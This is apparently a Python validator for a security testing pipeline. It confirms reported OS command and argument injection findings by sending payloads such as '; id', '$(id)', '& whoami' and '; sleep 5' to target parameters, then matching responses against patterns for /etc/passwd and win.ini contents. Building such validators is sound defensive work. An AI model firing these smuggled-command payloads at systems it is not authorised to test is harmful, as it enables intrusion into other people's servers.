"""
Command injection validation script for OS Command Injection testing.

Validates command injection vulnerabilities by:
1. Sending payloads with shell metacharacters
2. Checking for command output in responses
3. Measuring response time for blind time-based injection
4. Monitoring callbacks for out-of-band injection
5. Classifying results (VALIDATED, FALSE_POSITIVE, PARTIAL, UNVALIDATED)

CWE Coverage: CWE-78, CWE-77, CWE-88
"""

import hashlib
import json
import re
import time
from dataclasses import dataclass, field
from typing import Any, Optional
from urllib.parse import quote, urljoin

# Type hints for requests (not imported to avoid dependency)
# In actual use, import requests


@dataclass
class CommandInjectionTestResult:
    """Result of a command injection test."""

    status: str  # VALIDATED, FALSE_POSITIVE, PARTIAL, UNVALIDATED
    injection_type: str
    cwe: str
    platform: str
    payload_used: str
    evidence: str
    test_details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "status": self.status,
            "injection_type": self.injection_type,
            "cwe": self.cwe,
            "platform": self.platform,
            "payload_used": self.payload_used,
            "evidence": self.evidence,
            "test": self.test_details,
        }


class CommandInjectionValidator:
    """Validates command injection vulnerabilities."""

    # Patterns indicating successful command execution
    LINUX_OUTPUT_PATTERNS = [
        (r"uid=\d+\([^)]+\)", "id command"),
        (r"root:.*:0:0:", "/etc/passwd"),
        (r"(www-data|apache|nginx|nobody)", "web user"),
        (r"Linux\s+\S+\s+\d+\.\d+", "uname"),
        (r"/bin/(bash|sh|zsh)", "shell path"),
        (r"total\s+\d+\s*\n", "ls output"),
    ]

    WINDOWS_OUTPUT_PATTERNS = [
        (r"Volume in drive [A-Z]", "dir output"),
        (r"Directory of [A-Z]:", "dir output"),
        (r"\[fonts\]|\[extensions\]", "win.ini"),
        (r"NT AUTHORITY\\", "whoami"),
        (r"Microsoft Windows \[Version", "ver"),
        (r"\\Users\\", "user path"),
    ]

    def __init__(
        self,
        base_url: str,
        timeout: int = 10,
        verify_ssl: bool = True,
        callback_url: Optional[str] = None,
    ):
        """
        Initialize command injection validator.

        Args:
            base_url: Base URL of target application
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            callback_url: URL for OOB callback monitoring
        """
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.callback_url = callback_url
        self.session = None

    def _make_request(
        self,
        method: str,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        headers: Optional[dict] = None,
    ) -> tuple[int, str, dict, float]:
        """
        Make HTTP request and return status, body, headers, response_time.
        Placeholder - implement with actual HTTP client.
        """
        raise NotImplementedError("Implement with HTTP client library")

    def _hash_response(self, content: str) -> str:
        """Generate SHA256 hash of response content."""
        return f"sha256:{hashlib.sha256(content.encode()).hexdigest()[:16]}"

    def _truncate_snippet(self, content: str, max_len: int = 500) -> str:
        """Truncate response content for evidence."""
        if len(content) <= max_len:
            return content
        return content[:max_len] + "..."

    def _detect_platform(self, response: str) -> str:
        """Detect target platform from response content."""
        for pattern, _ in self.WINDOWS_OUTPUT_PATTERNS:
            if re.search(pattern, response, re.IGNORECASE):
                return "windows"
        for pattern, _ in self.LINUX_OUTPUT_PATTERNS:
            if re.search(pattern, response, re.IGNORECASE):
                return "linux"
        return "unknown"

    def _check_command_output(
        self, response: str, platform: str = "linux"
    ) -> Optional[tuple[str, str]]:
        """Check if response contains command execution output."""
        patterns = (
            self.LINUX_OUTPUT_PATTERNS
            if platform == "linux"
            else self.WINDOWS_OUTPUT_PATTERNS
        )
        for pattern, desc in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                return (match.group(), desc)
        return None

    def validate_direct(
        self,
        endpoint: str,
        param: str,
        base_value: str = "",
        method: str = "GET",
        platform: str = "linux",
    ) -> CommandInjectionTestResult:
        """
        Validate direct command injection (output visible).

        Args:
            endpoint: Target endpoint path
            param: Parameter to inject
            base_value: Base value to append payload to
            method: HTTP method
            platform: Target platform

        Returns:
            CommandInjectionTestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        # Platform-specific payloads
        if platform == "linux":
            payloads = [
                ("; id", "semicolon"),
                ("| id", "pipe"),
                ("`id`", "backtick"),
                ("$(id)", "dollar_paren"),
            ]
        else:
            payloads = [
                ("& whoami", "ampersand"),
                ("| whoami", "pipe"),
                ("&& whoami", "and"),
            ]

        for payload, separator in payloads:
            full_payload = base_value + payload

            try:
                if method.upper() == "GET":
                    params = {param: full_payload}
                    status_code, response_body, _, response_time = self._make_request(
                        "GET", endpoint, params=params
                    )
                else:
                    data = {param: full_payload}
                    status_code, response_body, _, response_time = self._make_request(
                        "POST", endpoint, data=data
                    )
            except Exception as e:
                continue

            # Check for command output
            output = self._check_command_output(response_body, platform)
            if output:
                matched_text, desc = output
                return CommandInjectionTestResult(
                    status="VALIDATED",
                    injection_type="command_injection_direct",
                    cwe="CWE-78",
                    platform=platform,
                    payload_used=payload,
                    evidence=f"Direct command injection: {desc} output detected",
                    test_details={
                        "url": f"{url}?{param}={quote(full_payload)}",
                        "method": method,
                        "status": status_code,
                        "separator": separator,
                        "matched_output": matched_text,
                        "response_snippet": self._truncate_snippet(response_body),
                        "response_hash": self._hash_response(response_body),
                    },
                )

        return CommandInjectionTestResult(
            status="FALSE_POSITIVE",
            injection_type="command_injection_direct",
            cwe="CWE-78",
            platform=platform,
            payload_used="multiple",
            evidence="No command output detected in response",
            test_details={"url": url, "param": param},
        )

    def validate_time_based(
        self,
        endpoint: str,
        param: str,
        base_value: str = "",
        method: str = "GET",
        platform: str = "linux",
        delay: int = 5,
    ) -> CommandInjectionTestResult:
        """
        Validate blind command injection via time delay.

        Args:
            endpoint: Target endpoint path
            param: Parameter to inject
            base_value: Base value to append payload to
            method: HTTP method
            platform: Target platform
            delay: Expected delay in seconds

        Returns:
            CommandInjectionTestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        # Get baseline response time
        try:
            if method.upper() == "GET":
                params = {param: base_value or "test"}
                _, _, _, baseline_time = self._make_request("GET", endpoint, params=params)
            else:
                data = {param: base_value or "test"}
                _, _, _, baseline_time = self._make_request("POST", endpoint, data=data)
        except Exception as e:
            return CommandInjectionTestResult(
                status="UNVALIDATED",
                injection_type="command_injection_time",
                cwe="CWE-78",
                platform=platform,
                payload_used="",
                evidence=f"Baseline request failed: {str(e)}",
                test_details={"url": url, "error": str(e)},
            )

        # Platform-specific delay payloads
        if platform == "linux":
            payloads = [
                (f"; sleep {delay}", "semicolon"),
                (f"| sleep {delay}", "pipe"),
                (f"`sleep {delay}`", "backtick"),
                (f"$(sleep {delay})", "dollar_paren"),
            ]
        else:
            payloads = [
                (f"& timeout /t {delay}", "ampersand"),
                (f"| ping -n {delay + 1} 127.0.0.1", "pipe_ping"),
            ]

        for payload, separator in payloads:
            full_payload = base_value + payload

            try:
                if method.upper() == "GET":
                    params = {param: full_payload}
                    status_code, response_body, _, response_time = self._make_request(
                        "GET", endpoint, params=params
                    )
                else:
                    data = {param: full_payload}
                    status_code, response_body, _, response_time = self._make_request(
                        "POST", endpoint, data=data
                    )
            except Exception:
                continue

            # Check if response was delayed
            delay_detected = response_time - baseline_time
            if delay_detected >= delay - 0.5:  # 0.5s tolerance
                return CommandInjectionTestResult(
                    status="VALIDATED",
                    injection_type="command_injection_blind_time",
                    cwe="CWE-78",
                    platform=platform,
                    payload_used=payload,
                    evidence=f"Blind command injection: {delay_detected:.1f}s delay detected",
                    test_details={
                        "url": f"{url}?{param}={quote(full_payload)}",
                        "method": method,
                        "status": status_code,
                        "separator": separator,
                        "baseline_time_ms": int(baseline_time * 1000),
                        "payload_time_ms": int(response_time * 1000),
                        "delay_detected_ms": int(delay_detected * 1000),
                        "expected_delay_s": delay,
                    },
                )

        return CommandInjectionTestResult(
            status="FALSE_POSITIVE",
            injection_type="command_injection_blind_time",
            cwe="CWE-78",
            platform=platform,
            payload_used="multiple",
            evidence="No significant delay detected",
            test_details={
                "url": url,
                "param": param,
                "baseline_time_ms": int(baseline_time * 1000),
            },
        )

    def validate_argument_injection(
        self,
        endpoint: str,
        param: str,
        method: str = "GET",
    ) -> CommandInjectionTestResult:
        """
        Validate argument injection (CWE-88).

        Args:
            endpoint: Target endpoint path
            param: Parameter to inject
            method: HTTP method

        Returns:
            CommandInjectionTestResult with validation status
        """
        url = urljoin(self.base_url, endpoint)

        payloads = [
            ("--help", "help"),
            ("-h", "help"),
            ("--version", "version"),
            ("-v", "verbose"),
        ]

        # Patterns indicating help/version output
        help_patterns = [
            r"usage:",
            r"options?:",
            r"--help",
            r"--version",
            r"synopsis",
            r"arguments?:",
        ]

        for payload, payload_type in payloads:
            try:
                if method.upper() == "GET":
                    params = {param: payload}
                    status_code, response_body, _, _ = self._make_request(
                        "GET", endpoint, params=params
                    )
                else:
                    data = {param: payload}
                    status_code, response_body, _, _ = self._make_request(
                        "POST", endpoint, data=data
                    )
            except Exception:
                continue

            # Check for help/version output
            for pattern in help_patterns:
                if re.search(pattern, response_body, re.IGNORECASE):
                    return CommandInjectionTestResult(
                        status="VALIDATED",
                        injection_type="argument_injection",
                        cwe="CWE-88",
                        platform="unknown",
                        payload_used=payload,
                        evidence=f"Argument injection: {payload_type} output revealed command options",
                        test_details={
                            "url": f"{url}?{param}={quote(payload)}",
                            "method": method,
                            "status": status_code,
                            "pattern_matched": pattern,
                            "response_snippet": self._truncate_snippet(response_body),
                        },
                    )

        return CommandInjectionTestResult(
            status="FALSE_POSITIVE",
            injection_type="argument_injection",
            cwe="CWE-88",
            platform="unknown",
            payload_used="multiple",
            evidence="No argument injection indicators detected",
            test_details={"url": url, "param": param},
        )


def validate_from_vulnerabilities(
    vulns_file: str, base_url: str, callback_url: Optional[str] = None
) -> list[dict[str, Any]]:
    """
    Validate command injection findings from VULNERABILITIES.json.

    Args:
        vulns_file: Path to VULNERABILITIES.json
        base_url: Base URL of target
        callback_url: URL for OOB callback monitoring

    Returns:
        List of validation results
    """
    with open(vulns_file) as f:
        vulns = json.load(f)

    validator = CommandInjectionValidator(base_url, callback_url=callback_url)
    results = []

    for vuln in vulns:
        if vuln.get("cwe") not in ["CWE-78", "CWE-77", "CWE-88"]:
            continue

        endpoint = vuln.get("endpoint", "/")
        param = vuln.get("param", "cmd")
        platform = vuln.get("platform", "linux")

        # Determine test type
        injection_type = vuln.get("injection_type", "direct")

        if injection_type == "time_based":
            result = validator.validate_time_based(endpoint, param, platform=platform)
        elif injection_type == "argument":
            result = validator.validate_argument_injection(endpoint, param)
        else:
            result = validator.validate_direct(endpoint, param, platform=platform)

        results.append(result.to_dict())

    return results


if __name__ == "__main__":
    print("Command Injection Validator - Example Usage")
    print("=" * 50)
    print(
        """
from validate_cmdi import CommandInjectionValidator

validator = CommandInjectionValidator("http://target.com")

# Test direct command injection
result = validator.validate_direct(
    endpoint="/ping",
    param="host",
    base_value="127.0.0.1",
    platform="linux"
)
print(result.to_dict())

# Test blind time-based injection
result = validator.validate_time_based(
    endpoint="/lookup",
    param="domain",
    delay=5,
    platform="linux"
)
print(result.to_dict())

# Test argument injection
result = validator.validate_argument_injection(
    endpoint="/backup",
    param="source"
)
print(result.to_dict())
    """
    )
